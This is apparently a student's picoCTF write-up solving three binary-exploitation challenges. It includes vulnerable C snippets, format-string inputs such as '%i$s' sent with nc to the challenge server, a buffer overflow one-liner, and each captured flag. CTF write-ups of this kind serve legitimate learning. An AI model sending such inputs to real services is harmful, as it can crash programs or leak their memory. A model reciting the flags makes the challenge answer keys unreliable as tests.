# picoCTF: Binary Exploitation

_for picoCTF challenges involving Binary Exploitation_

## format string 0

On typing out `~$ cat format-string-0.c` this section of the program looked particularly interesting:-


```
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

I knew `sigsev` referred to segmentation faults (Which I found out when I was trying to debug a program which I wrote for Advent of Code a while back), so I assumed causing the program to undergo a segfault will print the flag.

I ran `~$ gdb format-string-0` after giving permissions, I set `break main` then `run` and then repeatedly ran `ni` to go through the program. 

I played the game normally, and in the second part:-


```
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
```

I got:-

```
Program received signal SIGSEGV, Segmentation fault.
__strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:74
74      ../sysdeps/x86_64/multiarch/strlen-avx2.S: No such file or directory.
```

Got confused for a second there but I replayed the game after running the instance and got the flag.

flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}`

### incorrect tangents

not really a tangent but after:-

```
Program received signal SIGSEGV, Segmentation fault.
__strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:74
74      ../sysdeps/x86_64/multiarch/strlen-avx2.S: No such file or directory.
```

I realised I just had to do this on the challenge instance.


## flag leak

Was a bit hard, but then I looked up format strings in better detail from `https://wiki.bi0s.in/pwning/format-string/`, I found out that before the calling of `printf` the stack gets populated with the value of the variable we are referencing and the pointer to it. However if no variable is referenced the `printf` function just returns the last thing on the stack.

and we can see this behaviour by inputting `%i$s` where `i` represents the i'th offset from the top of the stack

so I kept running: `echo "%""i""$""s" | nc saturn.picoctf.net 51449` and kept changing the value of `i` as I proceeded and on the 24th iteration I got the flag (although I should have automated this process using a shell script or a python script).

flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`

### incorrect tangents

stringing together `%s` after `%s` won't work as per the page I referenced, also wasted some time trying to make a python script to automate this but it didn't work and I just decided to do it by hand

### learnings

1. learned more about format specifiers in C
2. learned what goes on in a printf function with a format specifer
3. learned how values are put on a stack for printf function


## buffer overflow 0

This was a very easy challenge, on inspecting the C code I noticed that the program used `gets` to get a string and store it in a variable with a size of 100, any attempt to store more than the given size would cause the overflow and give us the flag.

a simple: `python3 -c 'print("A"*101)' | nc saturn.picoctf.net 57333` was sufficient

flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

### incorrect tangents

None, pretty simple

### learnings

1. how to do a buffer overflow exploit
